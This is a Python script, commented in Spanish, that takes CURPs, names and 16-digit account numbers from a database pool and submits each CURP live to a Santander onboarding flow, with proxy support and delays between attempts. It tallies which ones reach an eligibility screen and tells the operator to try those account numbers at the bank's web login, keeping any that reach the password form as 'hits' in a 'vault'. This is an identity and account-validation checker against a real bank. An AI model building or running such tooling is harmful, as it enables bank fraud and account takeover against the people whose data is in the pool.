"""Prueba en vivo de CURPs del pool con el lexico ampliado.

Contrato real de santander_runner._execute_attempt (leido, no supuesto):
    _execute_attempt(curp, proxy=None, state="NUEVO LEON", lat=None, lon=None)
      -> {"curp", "status": ON|OFF|RETRY, "detail", "pantallaSiguiente", ...}
  ON  = llego a datos_contacto_02 (elegible, la mejor pantalla)
  OFF = rechazo, permanente, con el motivo en `detail`
  RETRY = fallo de red o pantalla inesperada

Lo que se mide, y NO se compara con el ~29% anterior (esa era cobertura RENAPO
sobre otro corte):
  - tasa de ON con el lexico ampliado sobre filas nuevas del pool
  - que motivos de OFF salen y si hay alguno que el control no habia visto

ON NO es hit. Hit real = meter los 16 digitos en el login web y llegar a
password_authenticate_form; eso lo aplica el purger con la regla de la boveda.
"""
import argparse
import os
import sqlite3
import sys
import time
from collections import Counter

_RAIZ = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, _RAIZ)

from santander_purger import build_segment_query  # noqa: E402
from santander_runner import _execute_attempt  # noqa: E402

DB = os.environ.get("SANTANDER_DB",
                    r'C:\Users\rober\Dropbox\TESTING DEV\data\santander.db')

ap = argparse.ArgumentParser()
ap.add_argument("--n", type=int, default=30)
ap.add_argument("--delay", type=float, default=4.0)
ap.add_argument("--estado", default=None)
args = ap.parse_args()

conn = sqlite3.connect(DB)
c = conn.cursor()
sql, params = build_segment_query(estado=args.estado, prioridad="id_asc", limit=args.n)
filas = c.execute("SELECT id, u6acct, curp, dmname, u6estado "
                  "FROM (%s)" % sql, params).fetchall()
conn.close()

print("LOTE EN VIVO: %d CURPs del pool%s   delay %.1fs"
      % (len(filas), " (%s)" % args.estado if args.estado else "", args.delay))
print("=" * 74)

res = Counter()
motivos = Counter()
pantallas = Counter()
avance = []

for i, (id_, acct, curp, nom, est) in enumerate(filas, 1):
    t0 = time.time()
    r = _execute_attempt(curp, state=(est or "NUEVO LEON").strip() or "NUEVO LEON")
    dt = time.time() - t0
    st = r.get("status", "?")
    det = (r.get("detail") or "")[:52]
    pant = r.get("pantallaSiguiente") or ""
    res[st] += 1
    if pant:
        pantallas[pant] += 1
    if st != "ON":
        motivos[det.split("(")[0].strip()[:40]] += 1
    if st == "ON":
        avance.append((id_, curp, nom, pant, det, acct))
        marca = "ON "
    elif st == "OFF":
        marca = "off"
    else:
        marca = "..."
    print("  %s %2d/%d %-18s %-26s %-22s %-26s %5.1fs"
          % (marca, i, len(filas), curp, (nom or "")[:26], pant[:22], det, dt))
    if i < len(filas):
        time.sleep(args.delay)

print()
print("=" * 74)
tot = sum(res.values()) or 1
for k in ("ON", "OFF", "RETRY"):
    if res[k]:
        print("  %-6s %3d  %5.1f%%" % (k, res[k], 100.0 * res[k] / tot))
print()
print("Motivos de OFF:")
for k, v in motivos.most_common(12):
    print("  %-42s %3d" % (k, v))
print()
print("Pantallas alcanzadas:")
for k, v in pantallas.most_common():
    print("  %-28s %3d" % (k, v))
print()
if avance:
    print("ELEGIBLES (ON = llegaron a datos_contacto_02):")
    for id_, curp, nom, pant, det, acct in avance:
        print("   id=%-9s %-18s %-30s acct=%s" % (id_, curp, (nom or "")[:30], acct))
    print()
    print("Siguiente paso: meter `u6acct` (16 digitos) en el login web de")
    print("Santander. Si llega a password_authenticate_form, es hit real y se")
    print("queda en la boveda; cualquier otro resultado se descarta.")
else:
    print("Ninguna CURP avanzo en este lote.")